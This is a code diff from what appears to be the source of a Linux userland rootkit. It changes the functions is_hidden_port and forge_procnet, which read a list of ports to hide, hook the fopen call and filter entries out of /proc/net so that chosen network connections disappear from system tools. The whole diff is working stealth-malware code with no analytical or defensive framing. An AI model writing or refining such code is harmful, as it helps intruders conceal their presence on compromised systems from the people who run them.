@@ -5,12 +5,12 @@ int is_hidden_port(int port){
         low_port,
         high_port;
 
-    if((fp = fopen(HIDEPORTS, "r")) == NULL)
+    hook(CFOPEN);
+    if((fp = call(CFOPEN, HIDEPORTS, "r")) == NULL)
         return 0;
 
     while(fgets(buf, sizeof(buf), fp) != NULL){
         buf[strlen(buf) - 1] = '\0';
-        if(!strncmp(buf, "#", 1)) continue;   /* skip potential comment lines */
 
         if(strstr(buf, "-")){   /* hide specific port ranges */
             /* get the lowest and highest ports within the range... */
@@ -52,13 +52,14 @@ FILE *forge_procnet(const char *pathname){
     if((pnt = call(CFOPEN, pathname, "r")) == NULL) return NULL;
     if((tmp = tmpfile()) == NULL) return pnt;
 
+    char *fmt = "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n";
     /* begin reading entries from said procnet file */
     while(fgets(line, sizeof(line), pnt) != NULL){
         /* read information from the current entry so we can see
            whether or not it should be hidden. */
-        sscanf(line, PROC_NET_STR, &d, laddr, &lport, raddr, &rport, &state, &txq,
-                                   &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
-                                   etc);
+        sscanf(line, fmt, &d, laddr, &lport, raddr, &rport, &state, &txq,
+                          &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
+                          etc);
 
         /* write information about the connection as long as it's
            not one that should be hidden... */
